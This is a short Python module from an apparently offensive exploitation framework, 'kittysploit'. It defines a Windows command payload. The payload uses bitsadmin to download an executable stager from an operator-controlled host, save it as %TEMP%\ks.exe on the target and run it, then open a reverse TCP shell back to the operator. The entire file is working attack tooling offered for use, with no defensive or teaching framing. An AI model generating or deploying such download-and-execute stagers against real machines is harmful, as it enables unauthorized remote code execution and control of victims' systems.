#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.download_stagers import build_bitsadmin_download_exec, build_stager_url


class Module(Payload):
    __info__ = {
        "name": "Windows Download Stager, bitsadmin",
        "description": "bitsadmin transfer + execute hosted EXE/stager (legacy Windows)",
        "category": PayloadCategory.CMD,
        "platform": Platform.WINDOWS,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Operator host serving stager", True)
    lport = OptPort(4444, "Callback port for embedded stager", True)
    stager_url = OptString("", "Full URL of hosted binary", False)
    stager_port = OptInteger(8000, "HTTP port when stager_url empty", False, advanced=True)
    dest = OptString("%TEMP%\\ks.exe", "Local path on target", False)

    def generate(self):
        url = str(self.stager_url or "").strip()
        if not url:
            url = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.exe")
            print_info(f"stager_url not set — using {url}")
        return build_bitsadmin_download_exec(url, str(self.dest or "%TEMP%\\ks.exe"))
